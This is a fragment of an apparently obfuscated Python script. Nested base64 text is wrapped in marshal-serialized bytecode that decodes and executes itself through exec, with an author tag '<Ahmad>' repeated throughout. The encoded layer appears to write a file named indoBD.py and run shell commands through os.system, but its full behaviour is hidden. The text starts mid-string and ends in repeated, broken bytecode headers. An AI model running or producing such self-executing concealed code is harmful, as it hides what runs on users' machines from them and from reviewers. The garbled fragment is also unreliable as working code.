hzYkZsWVNucEtkMjluU1VOQlowbERRV2RKUTJSNlpFZEdNR1JZVFc1SlEwRTJTVU5rZW1SSVZtdGFWelV3VERKd2RtSlhTbk5pZW5BeVNuZHZaMGxEUVdkSlEwRm5TVU5rYTFsWVVteEtlVUZuU1VOQk5rbERZM2xPVXpoNFRXazRlVTFFU1hoS2QzQTVRMmR2WjBsRFFXZEpRMEZuU1VGdlowbERRV2RKUTBGblNVTkphVWxuYjJkSlEwRm5TVU5CWjBsSVVubGxWRzlMU1VOQlowbERRV2RKUTBGblNVTkJaMkl6UW14aWFXZHBZVmMxYTJJd1NrVk1ia0kxU1dsM2FXUjVTWEJNYm1SNVlWaFNiRXRIV1dsbE0wNTJaRmhLYWxwV09XcGlNbEpzWmxOSmNFTnBRV2RKUTBGblNVTkJaMGxEUVdkSlJ6bDNXbGMwYjBsc1NrWlJWVkpPVWxNMWRGcERTWE5KYm1OcFMxTTFNMk50YkRCYVUyaHRTVzUwZVZwWFJtdGlWMVptWWxkU09VbHBhMHRKUTBGblNVTkJaMGxEUVdkSlEwRm5ZMGhLY0dKdVVXZExRMlJqWW14MGNGaFlUakZoTWxaNldsaE5aMkpYVm5SWmJsWm9aRU5DZEdJeVVqRmlRMFZ1UzFSMGVtSkhWbXhqUTJkNFMxRnZaMGxEUVdkSlEwRm5TVU5CWjBsRFFuZGpiV3gxWkVOQmIwbHNkSEJZV0U1d1lrZEdiMkV5Um5WSlIzaHdaRWRXZVZsWVRuQkpTRTV3WW0xa2NsbFlVV2RaYld4b1kybENkMWxYYUdoaVZuaDFTV2xyTjJNeWVHeGFXRUZ2VFZOclMwbERRV2RKUTBGblNVTkJaMGxEUVdkak0yeDZaRWRXZEV0RFpIVlpWelYyU1VaS1JsRlZVazVTVXpWMFdrTmpjRU5uYjJkSlEwRm5TVU5CWjBsSFZqUlpNbFozWkVSdloyTklTbkJpYmxGblMwTmtZMkp0WkdoYU1rWnpTVlo0ZFVwNWF6ZGFXR2h3WkVObmNFTm5jSEJhYVVKbVdESTFhR0pYVm1aWWVqQTVTakU1Wm1KWFJuQmliRGxtU25wdlMwbERRV2RKUjJ4MVl6TlNhR0pIZUhCaWJXTnZTMU5CWjBsRFFVc25LU2s9Jykp)\x03\xda\x06base64\xda\x04execZ\tb64decode\xa9\x00r\x04\x00\x00\x00r\x04\x00\x00\x00\xfa\x07<Ahmad>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x00)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x07<Ahmad>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x00)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x07<Ahmad>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x00)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x07<Ahmad>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x00)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x07<Ahmad>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x00'))'))